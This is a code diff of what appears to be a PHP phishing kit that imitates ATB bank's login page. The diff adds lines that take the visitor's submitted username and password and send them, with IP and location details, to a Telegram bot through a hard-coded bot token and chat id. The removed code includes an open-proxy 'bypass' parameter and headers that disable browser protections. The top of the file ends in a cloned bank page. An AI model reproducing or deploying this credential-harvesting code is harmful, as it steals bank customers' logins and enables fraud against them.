@@ -1,134 +1,15 @@
 <?php
-
-header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
-header("X-XSS-Protection: 0");
-header("X-Frame-Options: ALLOWALL");
-header("Access-Control-Allow-Origin: *");
-header("Access-Control-Allow-Credentials: true");
-header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
-header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");
-
-if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
-    $url = $_GET['url'];
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_HEADER, false);
-    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
-    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
-        "X-XSS-Protection: 0",
-        "X-Frame-Options: ALLOWALL",
-        "Access-Control-Allow-Origin: *",
-        "Access-Control-Allow-Credentials: true",
-        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
-        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
-    ));
-    $response = curl_exec($ch);
-    $info = curl_getinfo($ch);
-    curl_close($ch);
-
-    header("HTTP/1.1 ".$info['http_code']);
-    foreach ($info['headers'] as $header) {
-        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
-            header($header);
-        }
-    }
-    echo $response;
-    exit;
-}
-
+include '/headers.php';
+include '/bypass.php';
+include '/functions.php';
 
 $full_date = date("h:i:s|M/d/Y");
 $time = date("h:i:s");
 $date = date("M/d/Y");
 
-function get_client_ip()
-{
-    $ipaddress = '';
-    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
-        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
-    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
-    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
-        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
-    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
-        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
-    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
-        $ipaddress = $_SERVER['HTTP_FORWARDED'];
-    } else if (isset($_SERVER['REMOTE_ADDR'])) {
-        $ipaddress = $_SERVER['REMOTE_ADDR'];
-    } else {
-        $ipaddress = 'UNKNOWN';
-    }
-
-    return $ipaddress;
-}
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-
-function getOS() { 
-    global $user_agent;
-    $os_platform  = "Unknown OS Platform";
-    $os_array     = array(
-                          '/windows nt 10/i'      =>  'Windows 10',
-                          '/windows nt 6.3/i'     =>  'Windows 8.1',
-                          '/windows nt 6.2/i'     =>  'Windows 8',
-                          '/windows nt 6.1/i'     =>  'Windows 7',
-                          '/windows nt 6.0/i'     =>  'Windows Vista',
-                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
-                          '/windows nt 5.1/i'     =>  'Windows XP',
-                          '/windows xp/i'         =>  'Windows XP',
-                          '/windows nt 5.0/i'     =>  'Windows 2000',
-                          '/windows me/i'         =>  'Windows ME',
-                          '/win98/i'              =>  'Windows 98',
-                          '/win95/i'              =>  'Windows 95',
-                          '/win16/i'              =>  'Windows 3.11',
-                          '/macintosh|mac os x/i' =>  'Mac OS X',
-                          '/mac_powerpc/i'        =>  'Mac OS 9',
-                          '/linux/i'              =>  'Linux',
-                          '/ubuntu/i'             =>  'Ubuntu',
-                          '/iphone/i'             =>  'iPhone',
-                          '/ipod/i'               =>  'iPod',
-                          '/ipad/i'               =>  'iPad',
-                          '/android/i'            =>  'Android',
-                          '/blackberry/i'         =>  'BlackBerry',
-                          '/webos/i'              =>  'Mobile'
-                    );
-
-    foreach ($os_array as $regex => $value)
-        if (preg_match($regex, $user_agent))
-            $os_platform = $value;
-
-    return $os_platform;
-}
-
-function getBrowser() {
-    global $user_agent;
-    $browser        = "Unknown Browser";
-    $browser_array = array(
-                            '/msie/i'      => 'Internet Explorer',
-                            '/firefox/i'   => 'Firefox',
-                            '/safari/i'    => 'Safari',
-                            '/chrome/i'    => 'Chrome',
-                            '/edge/i'      => 'Edge',
-                            '/opera/i'     => 'Opera',
-                            '/netscape/i'  => 'Netscape',
-                            '/maxthon/i'   => 'Maxthon',
-                            '/konqueror/i' => 'Konqueror',
-                            '/mobile/i'    => 'Handheld Browser'
-                     );
-
-    foreach ($browser_array as $regex => $value)
-        if (preg_match($regex, $user_agent))
-            $browser = $value;
-
-    return $browser;
-}
-
-
 $user_os        = getOS();
 $user_browser   = getBrowser();
- 
+
 $PublicIP = get_client_ip();
 $localHost = "127.0.0.1";
 
@@ -178,13 +59,15 @@ if ($success==false) {
     $type       = $tp;
     $bank       = "ATB";
     $url        = "https://ATB.com";
-	$lh     = "|";
+    $user       = $_POST['username'];
+    $pass       = $_POST['password'];
+    $lh     = "|";
     $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
     $isp        = $is;
     $currency   = "".$full_date;
-     $li     = ",";
+    $li     = ",";
 
-    
+
 
 } else {
     $status     = "Status : ".$success;
@@ -195,7 +78,7 @@ if ($success==false) {
 
 
 
-$message =" $bank$lh$ip\n\n-----------------\n\n$bsr$lh$uos\n\n-----------------\n\n$is\n\n-----------------\n\n$city$lh$country\n\n-----------------\n\n$la$li$lp\n\n-----------------\n\n$uaget";
+$message =" $bank$lh$ip\n\n-----------------\n\n$user\n\n----------------\n\n$pass\n\n---------------------\n\n";
 $apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
 $data = [
     'chat_id' => '-821080105',
@@ -204,8 +87,6 @@ $data = [
 
 $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                  http_build_query($data) );
-                                                    
-
 ?><html lang="en"><head><script src="//bat.bing.com/bat" async=""></script><script async="" src="https://static.ads-twitter.com/uwt"></script><script src="https://www.redditstatic.com/ads/pixel" async=""></script><script async="" src="//s.usea01.idio.episerver.net/ia"></script><script type="text/javascript" async="" src="./files/js" nonce=""></script><script type="text/javascript" async="" src="./files/linkid" nonce=""></script><script src="./files/bat" async=""></script><script src="./files/pixel" async=""></script><script async="" src="./files/ia"></script><script type="text/javascript" async="" src="./files/analytics" nonce=""></script><script gtm="GTM-P78HH3L" type="text/javascript" async="" src="./files/optimize" nonce=""></script><script async="true" src="./files/17eb3427-295d-4bad-ad7f-c00f3eccac17" crossorigin="anonymous"></script><script async="" src="./files/main.f6304d83"></script><script src="./files/banner" type="text/javascript" id="cookieBanner-4764334" data-cookieconsent="ignore" data-hs-ignore="true" data-loader="hs-scriptloader" data-hsjs-portal="4764334" data-hsjs-env="prod" data-hsjs-hublet="na1"></script><script src="./files/fb" type="text/javascript" id="hs-ads-pixel-4764334" data-ads-portal-id="4764334" data-ads-env="prod" data-loader="hs-scriptloader" data-hsjs-portal="4764334" data-hsjs-env="prod" data-hsjs-hublet="na1"></script><script type="text/javascript" async="" src="./files/recaptcha__en" crossorigin="anonymous" integrity="sha384-CCh6u4Amw2vSb1Un+qTYXrp+Sexi2puR9Asf4xQ9cw5NND/M2JxupcwYQs/lmUKR" nonce=""></script><script async="" src="./files/uwt"></script><script type="text/javascript" async="" src="./files/oct"></script><script src="./files/events"></script><script async="" src="./files/scevent.min"></script><script type="text/javascript" async="" src="./files/siteanalyze_77682"></script><script async="" src="./files/qevents"></script><script src="./files/quant" async="" type="text/javascript"></script><script async="" src="./files/core"></script><script type="text/javascript" async="" src="./files/insight.min"></script><script src="./files/2280495035427110" async=""></script><script src="./files/identity" async=""></script><script src="./files/inferredevents" async=""></script><script src="./files/257927721713078" async=""></script><script async="" src="./files/fbevents"></script><script src="./files/embed" type="text/javascript"></script><script src="./files/4764334" type="text/javascript" id="hs-analytics"></script><script async="" src="./files/gtm"></script><script async="" src="./files/api"></script><script src="/page/prompt"></script><script src="/page/runScript"></script><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     
     
